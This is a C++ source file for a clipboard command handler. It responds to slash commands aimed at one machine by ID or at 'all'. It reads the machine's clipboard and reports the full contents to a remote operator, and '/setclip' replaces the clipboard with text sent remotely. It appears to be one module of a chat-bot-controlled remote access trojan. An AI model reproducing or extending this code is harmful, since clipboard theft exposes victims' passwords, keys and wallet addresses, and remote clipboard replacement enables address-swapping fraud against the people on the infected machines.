#include "application/commands/ClipboardHandler.hpp"

#include <algorithm>

namespace nuub::application::commands {

ClipboardHandler::ClipboardHandler(
    interfaces::IClipboardService& clipboard,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : clipboard_(clipboard)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool ClipboardHandler::matches(const std::string& target) const {
    if (target.empty()) return true;
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> ClipboardHandler::handle_clipboard(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    auto content = clipboard_.get_clipboard();
    if (content.empty()) {
        reporter_.send_message("Portapapeles vacio.");
    } else {
        reporter_.send_message("Portapapeles:\n" + content);
    }
    return domain::Result<void>::success();
}

domain::Result<void> ClipboardHandler::handle_setclip(const std::string& target, const std::string& text) {
    if (!matches(target)) return domain::Result<void>::success();

    if (text.empty()) {
        reporter_.send_message("Uso: /setclip [target] <texto>");
        return domain::Result<void>::success();
    }

    clipboard_.set_clipboard(text);
    reporter_.send_message("Portapapeles actualizado.");
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
